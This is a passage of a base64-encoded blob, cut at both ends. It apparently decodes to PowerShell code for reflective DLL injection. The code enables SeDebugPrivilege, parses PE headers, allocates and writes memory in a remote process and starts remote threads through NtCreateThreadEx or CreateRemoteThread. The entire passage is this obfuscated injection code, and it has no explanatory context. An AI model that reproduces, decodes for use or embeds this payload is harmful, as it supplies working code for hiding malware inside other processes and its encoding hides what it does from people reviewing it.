sJykgfQ0KCQkJJFVuc2FmZU5hdGl2ZU1ldGhvZHMgPSAkU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKTsNCgkJCSRHZXRNb2R1bGVIYW5kbGUgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpOw0KCQkJJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycpOw0KCQkJJEtlcm4zMkhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKTsNCgkJCSR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cjsNCgkJCSRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSk7DQoJCQlXcml0ZS1PdXRwdXQgJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCwgQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSk7DQoJCX0NCgkJRnVuY3Rpb24gRW5hYmxlLVNlRGVidWdQcml2aWxlZ2UNCgkJew0KCQkJUGFyYW0gKA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyRnVuY3Rpb25zLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyVHlwZXMsDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbU3lzdGVtLk9iamVjdF0kV2luMzJDb25zdGFudHMNCgkJCSkNCgkJCVtJbnRQdHJdJFRocmVhZEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRDdXJyZW50VGhyZWFkLkludm9rZSgpOw0KCQkJaWYgKCRUaHJlYWRIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQ0KCQkJew0KCQkJCSRjbWRSZXMuVmFsdWUgPSA3Ow0KCQkJCXRocm93ICJVbmFibGUgdG8gZ2V0IHRoZSBoYW5kbGUgdG8gdGhlIGN1cnJlbnQgdGhyZWFkIjsNCgkJCX0NCgkJCVtJbnRQdHJdJFRocmVhZFRva2VuID0gW0ludFB0cl06Olplcm87DQoJCQlbQm9vbF0kUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLk9wZW5UaHJlYWRUb2tlbi5JbnZva2UoJFRocmVhZEhhbmRsZSwgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX1FVRVJZIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX0FESlVTVF9QUklWSUxFR0VTLCAkZmFsc2UsIFtSZWZdJFRocmVhZFRva2VuKTsNCgkJCWlmICgkUmVzdWx0IC1lcSAkZmFsc2UpDQoJCQl7DQoJCQkJJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCk7DQoJCQkJaWYgKCRFcnJvckNvZGUgLWVxICRXaW4zMkNvbnN0YW50cy5FUlJPUl9OT19UT0tFTikNCgkJCQl7DQoJCQkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuSW1wZXJzb25hdGVTZWxmLkludm9rZSgzKTsNCgkJCQkJaWYgKCRSZXN1bHQgLWVxICRmYWxzZSkNCgkJCQkJew0KCQkJCQkJJGNtZFJlcy5WYWx1ZSA9IDg7DQoJCQkJCQl0aHJvdyAiVW5hYmxlIHRvIGltcGVyc29uYXRlIHNlbGYiOw0KCQkJCQl9DQoJCQkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuT3BlblRocmVhZFRva2VuLkludm9rZSgkVGhyZWFkSGFuZGxlLCAkV2luMzJDb25zdGFudHMuVE9LRU5fUVVFUlkgLWJvciAkV2luMzJDb25zdGFudHMuVE9LRU5fQURKVVNUX1BSSVZJTEVHRVMsICRmYWxzZSwgW1JlZl0kVGhyZWFkVG9rZW4pOw0KCQkJCQlpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQ0KCQkJCQl7DQoJCQkJCQkkY21kUmVzLlZhbHVlID0gOTsNCgkJCQkJCXRocm93ICJVbmFibGUgdG8gT3BlblRocmVhZFRva2VuLiI7DQoJCQkJCX0NCgkJCQl9DQoJCQkJZWxzZQ0KCQkJCXsNCgkJCQkJJGluamVjdGlvbkVycm9yQ29kZS5WYWx1ZSA9ICRFcnJvckNvZGUuVG9TdHJpbmcoKTsNCgkJCQkJJGNtZFJlcy5WYWx1ZSA9IDEwOw0KCQkJCQl0aHJvdyAiVW5hYmxlIHRvIE9wZW5UaHJlYWRUb2tlbi4gRXJyb3IgY29kZTogJEVycm9yQ29kZSI7DQoJCQkJfQ0KCQkJfQ0KCQkJW0ludFB0cl0kUEx1aWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLkxVSUQpKTsNCgkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuTG9va3VwUHJpdmlsZWdlVmFsdWUuSW52b2tlKCRudWxsLCAiU2VEZWJ1Z1ByaXZpbGVnZSIsICRQTHVpZCk7DQoJCQlpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQ0KCQkJew0KCQkJCSRjbWRSZXMuVmFsdWUgPSAxMTsNCgkJCQl0aHJvdyAiVW5hYmxlIHRvIGNhbGwgTG9va3VwUHJpdmlsZWdlVmFsdWUiOw0KCQkJfQ0KCQkJW1VJbnQzMl0kVG9rZW5Qcml2U2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5UT0tFTl9QUklWSUxFR0VTKTsNCgkJCVtJbnRQdHJdJFRva2VuUHJpdmlsZWdlc01lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG9rZW5Qcml2U2l6ZSk7DQoJCQkkVG9rZW5Qcml2aWxlZ2VzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRva2VuUHJpdmlsZWdlc01lbSwgW1R5cGVdJFdpbjMyVHlwZXMuVE9LRU5fUFJJVklMRUdFUyk7DQoJCQkkVG9rZW5Qcml2aWxlZ2VzLlByaXZpbGVnZUNvdW50ID0gMTsNCgkJCSRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlcy5MdWlkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFBMdWlkLCBbVHlwZV0kV2luMzJUeXBlcy5MVUlEKTsNCgkJCSRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlcy5BdHRyaWJ1dGVzID0gJFdpbjMyQ29uc3RhbnRzLlNFX1BSSVZJTEVHRV9FTkFCTEVEOw0KCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJFRva2VuUHJpdmlsZWdlcywgJFRva2VuUHJpdmlsZWdlc01lbSwgJHRydWUpOw0KCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5BZGp1c3RUb2tlblByaXZpbGVnZXMuSW52b2tlKCRUaHJlYWRUb2tlbiwgJGZhbHNlLCAkVG9rZW5Qcml2aWxlZ2VzTWVtLCAkVG9rZW5Qcml2U2l6ZSwgW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvKTsNCgkJCSRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpOw0KCQkJaWYgKCgkUmVzdWx0IC1lcSAkZmFsc2UpIC1vciAoJEVycm9yQ29kZSAtbmUgMCkpDQoJCQl7DQoJCQkJJGluamVjdGlvbkVycm9yQ29kZS5WYWx1ZSA9ICRFcnJvckNvZGUuVG9TdHJpbmcoKTsNCgkJCQkkY21kUmVzLlZhbHVlID0gMTI7DQoJCQl9DQoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVG9rZW5Qcml2aWxlZ2VzTWVtKTsNCgkJfQ0KICAgICAgICBGdW5jdGlvbiBDcmVhdGUtUmVtb3RlVGhyZWFkDQogICAgCXsNCiAgICAJCVBhcmFtKA0KICAgIAkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCiAgICAJCVtJbnRQdHJdDQogICAgCQkkUHJvY2Vzc0hhbmRsZSwNCiAgICAJCQ0KICAgIAkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCiAgICAJCVtJbnRQdHJdDQogICAgCQkkU3RhcnRBZGRyZXNzLA0KICAgIAkJDQogICAgCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJGZhbHNlKV0NCiAgICAJCVtJbnRQdHJdDQogICAgCQkkQXJndW1lbnRQdHIgPSBbSW50UHRyXTo6WmVybywNCiAgICAJCQ0KICAgIAkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCiAgICAJCVtTeXN0ZW0uT2JqZWN0XQ0KICAgIAkJJFdpbjMyRnVuY3Rpb25zDQogICAgCQkpDQogICAgCQkNCiAgICAJCVtJbnRQdHJdJFJlbW90ZVRocmVhZEhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvDQogICAgCQkNCiAgICAJCSRPU1ZlcnNpb24gPSBbRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbg0KICAgIAkJI1Zpc3RhIGFuZCBXaW43DQogICAgCQlpZiAoKCRPU1ZlcnNpb24gLWdlIChOZXctT2JqZWN0ICdWZXJzaW9uJyA2LDApKSAtYW5kICgkT1NWZXJzaW9uIC1sdCAoTmV3LU9iamVjdCAnVmVyc2lvbicgNiwyKSkpDQogICAgCQl7DQogICAgCQkJI1dyaXRlLVZlcmJvc2UgIldpbmRvd3MgVmlzdGEvNyBkZXRlY3RlZCwgdXNpbmcgTnRDcmVhdGVUaHJlYWRFeC4gQWRkcmVzcyBvZiB0aHJlYWQ6ICRTdGFydEFkZHJlc3MiDQogICAgCQkJJFJldFZhbD0gJFdpbjMyRnVuY3Rpb25zLk50Q3JlYXRlVGhyZWFkRXguSW52b2tlKFtSZWZdJFJlbW90ZVRocmVhZEhhbmRsZSwgMHgxRkZGRkYsIFtJbnRQdHJdOjpaZXJvLCAkUHJvY2Vzc0hhbmRsZSwgJFN0YXJ0QWRkcmVzcywgJEFyZ3VtZW50UHRyLCAkZmFsc2UsIDAsIDB4ZmZmZiwgMHhmZmZmLCBbSW50UHRyXTo6WmVybykNCiAgICAJCQkkTGFzdEVycm9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQ0KICAgIAkJCWlmICgkUmVtb3RlVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykNCiAgICAJCQl7DQogICAgCQkJCVRocm93ICJFcnJvciBpbiBOdENyZWF0ZVRocmVhZEV4LiBSZXR1cm4gdmFsdWU6ICRSZXRWYWwuIExhc3RFcnJvcjogJExhc3RFcnJvciINCiAgICAJCQl9DQogICAgCQl9DQogICAgCQkjWFAvV2luOA0KICAgIAkJZWxzZQ0KICAgIAkJew0KICAgIAkJCSNXcml0ZS1WZXJib3NlICJXaW5kb3dzIFhQLzggZGV0ZWN0ZWQsIHVzaW5nIENyZWF0ZVJlbW90ZVRocmVhZC4gQWRkcmVzcyBvZiB0aHJlYWQ6ICRTdGFydEFkZHJlc3MiDQogICAgCQkJJFJlbW90ZVRocmVhZEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5DcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRQcm9jZXNzSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdW1VJbnQ2NF0weEZGRkYsICRTdGFydEFkZHJlc3MsICRBcmd1bWVudFB0ciwgMCwgW0ludFB0cl06Olplcm8pDQogICAgCQl9DQogICAgCQkNCiAgICAJCWlmICgkUmVtb3RlVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykNCiAgICAJCXsNCiAgICAJCQlXcml0ZS1FcnJvciAiRXJyb3IgY3JlYXRpbmcgcmVtb3RlIHRocmVhZCwgdGhyZWFkIGhhbmRsZSBpcyBudWxsIiAtRXJyb3JBY3Rpb24gU3RvcA0KICAgIAkJfQ0KICAgIAkJDQogICAgCQlyZXR1cm4gJFJlbW90ZVRocmVhZEhhbmRsZQ0KICAgIAl9DQogICAgDQoJCUZ1bmN0aW9uIEdldC1JbWFnZU50SGVhZGVycw0KCQl7DQoJCQlQYXJhbSAoDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbSW50UHRyXSRQRUhhbmRsZSwNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtTeXN0ZW0uT2JqZWN0XSRXaW4zMlR5cGVzDQoJCQkpDQoJCQkkTnRIZWFkZXJzSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdDsNCgkJCSRkb3NIZWFkZXIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkUEVIYW5kbGUsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0RPU19IRUFERVIpOw0KCQkJW0ludFB0cl0kTnRIZWFkZXJzUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVIYW5kbGUpIChbSW50NjRdW1VJbnQ2NF0kZG9zSGVhZGVyLmVfbGZhbmV3KSk7DQoJCQkkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE50SGVhZGVyc1B0ciAtVmFsdWUgJE50SGVhZGVyc1B0cjsNCgkJCSRpbWFnZU50SGVhZGVyczY0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE50SGVhZGVyc1B0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfTlRfSEVBREVSUzY0KTsNCgkJCWlmICgkaW1hZ2VOdEhlYWRlcnM2NC5TaWduYXR1cmUgLW5lIDB4MDAwMDQ1NTApDQoJCQl7DQoJCQkJJGNtZFJlcy5WYWx1ZSA9IDEzOw0KCQkJCXRocm93ICJJbnZhbGlkIElNQUdFX05UX0hFQURFUiBzaWduYXR1cmUuIjsNCgkJCX0NCgkJCWlmICgkaW1hZ2VOdEhlYWRlcnM2NC5PcHRpb25hbEhlYWRlci5NYWdpYyAtZXEgJ0lNQUdFX05UX09QVElPTkFMX0hEUjY0X01BR0lDJykNCgkJCXsNCgkJCQkkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX05UX0hFQURFUlMgLVZhbHVlICRpbWFnZU50SGVhZGVyczY0Ow0KCQkJCSROdEhlYWRlcnNJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEU2NEJpdCAtVmFsdWUgJHRydWU7DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJEltYWdlTnRIZWFkZXJzMzIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkTnRIZWFkZXJzUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9OVF9IRUFERVJTMzIpOw0KCQkJCSROdEhlYWRlcnNJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfTlRfSEVBREVSUyAtVmFsdWUgJGltYWdlTnRIZWFkZXJzMzI7DQoJCQkJJE50SGVhZGVyc0luZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQRTY0Qml0IC1WYWx1ZSAkZmFsc2U7DQoJCQl9DQoJCQlyZXR1cm4gJE50SGVhZGVyc0luZm87DQoJCX0NCgkJRnVuY3Rpb24gR2V0LVBFQmFzaWNJbmZvDQoJCXsNCgkJCVBhcmFtICgNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtCeXRlW11dJFBFQnl0ZXMsDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbU3lzdGVtLk9iamVjdF0kV2luMzJUeXBlcw0KCQkJKQ0KCQkJJFBFSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdDsNCgkJCVtJbnRQdHJdJFVubWFuYWdlZFBFQnl0ZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFBFQnl0ZXMuTGVuZ3RoKTsNCgkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFBFQnl0ZXMsIDAsICRVbm1hbmFnZWRQRUJ5dGVzLCAkUEVCeXRlcy5MZW5ndGgpIHwgT3V0LU51bGw7DQoJCQkkTnRIZWFkZXJzSW5mbyA9IEdldC1JbWFnZU50SGVhZGVycyAtUEVIYW5kbGUgJFVubWFuYWdlZFBFQnl0ZXMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXM7DQoJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1BFNjRCaXQnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uUEU2NEJpdCk7DQoJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ09yaWdpbmFsSW1hZ2VCYXNlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuSW1hZ2VCYXNlKTsNCgkJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnU2l6ZU9mSW1hZ2UnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5TaXplT2ZJbWFnZSk7DQoJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkhlYWRlcnMnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5TaXplT2ZIZWFkZXJzKTsNCgkJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnRGxsQ2hhcmFjdGVyaXN0aWNzJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuRGxsQ2hhcmFjdGVyaXN0aWNzKTsNCgkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRVbm1hbmFnZWRQRUJ5dGVzKTsNCgkJCXJldHVybiAkUEVJbmZvOw0KCQl9DQoJCUZ1bmN0aW9uIEdldC1QRURldGFpbGVkSW5mbw0KCQl7DQoJCQlQYXJhbSAoDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbSW50UHRyXSRQRUhhbmRsZSwNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtTeXN0ZW0uT2JqZWN0XSRXaW4zMlR5cGVzLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyQ29uc3RhbnRzDQoJCQkpDQoJCQlpZiAoJFBFSGFuZGxlIC1lcSAkbnVsbCAtb3IgJFBFSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykNCgkJCXsNCgkJCQkkY21kUmVzLlZhbHVlID0gMTQ7DQoJCQkJdGhyb3cgJ1BFSGFuZGxlIGlzIG51bGwgb3IgSW50UHRyLlplcm8nOw0KCQkJfQ0KCQkJJFBFSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdDsNCgkJCSROdEhlYWRlcnNJbmZvID0gR2V0LUltYWdlTnRIZWFkZXJzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXM7DQoJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEVIYW5kbGUgLVZhbHVlICRQRUhhbmRsZTsNCgkJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUyk7DQoJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTnRIZWFkZXJzUHRyIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uTnRIZWFkZXJzUHRyKTsNCgkJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQRTY0Qml0IC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uUEU2NEJpdCk7DQoJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkltYWdlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSW1hZ2UpOw0KCQkJaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpDQoJCQl7DQoJCQkJW0ludFB0cl0kU2VjdGlvbkhlYWRlclB0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5OdEhlYWRlcnNQdHIpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfTlRfSEVBREVSUzY0KSkpOw0KCQkJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBTZWN0aW9uSGVhZGVyUHRyIC1WYWx1ZSAkU2VjdGlvbkhlYWRlclB0cjsNCgkJCX0NCgkJCWVsc2UNCgkJCXsNCgkJCQlbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLk50SGVhZGVyc1B0cikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9OVF9IRUFERVJTMzIpKSk7DQoJCQkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFNlY3Rpb25IZWFkZXJQdHIgLVZhbHVlICRTZWN0aW9uSGVhZGVyUHRyOw0KCQkJfQ0KCQkJaWYgKCgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLkZpbGVIZWFkZXIuQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0RMTCkgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0RMTCkNCgkJCXsNCgkJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRmlsZVR5cGUgLVZhbHVlICdETEwnOw0KCQkJfQ0KCQkJZWxzZQ0KCQkJew0KCQkJCSRjbWRSZXMuVmFsdWUgPSAxNTsNCgkJCQl0aHJvdyAiUEUgZmlsZSBpcyBub3QgYSBETEwiOw0KCQkJfQ0KCQkJcmV0dXJuICRQRUluZm87DQoJCX0NCgkJRnVuY3Rpb24gSW1wb3J0LURsbEluUmVtb3RlUHJvY2Vzcw0KCQl7DQoJCQlQYXJhbSAoDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbSW50UHRyXSRSZW1vdGVQcm9jSGFuZGxlLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW0ludFB0cl0kSW1wb3J0RGxsUGF0aFB0cg0KCQkJKQ0KCQkJJFB0clNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pOw0KCQkJJEltcG9ydERsbFBhdGggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJEltcG9ydERsbFBhdGhQdHIpOw0KCQkJJERsbFBhdGhTaXplID0gW1VJbnRQdHJdW1VJbnQ2NF0oW1VJbnQ2NF0kSW1wb3J0RGxsUGF0aC5MZW5ndGggKyAxKTsNCgkJCSRSSW1wb3J0RGxsUGF0aFB0ciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCAkRGxsUGF0aFNpemUsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUpOw0KCQkJaWYgKCRSSW1wb3J0RGxsUGF0aFB0ciAtZXEgW0ludFB0cl06Olplcm8pDQoJCQl7DQoJCQkJJGNtZFJlcy5WYWx1ZSA9IDE2Ow0KCQkJCXRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyI7DQoJCQl9DQoJCQlbVUludFB0cl0kTnVtQnl0ZXNXcml0dGVuID0gW1VJbnRQdHJdOjpaZXJvOw0KCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJJbXBvcnREbGxQYXRoUHRyLCAkSW1wb3J0RGxsUGF0aFB0ciwgJERsbFBhdGhTaXplLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pOw0KCQkJaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpDQoJCQl7DQoJCQkJJGNtZFJlcy5WYWx1ZSA9IDE3Ow0KC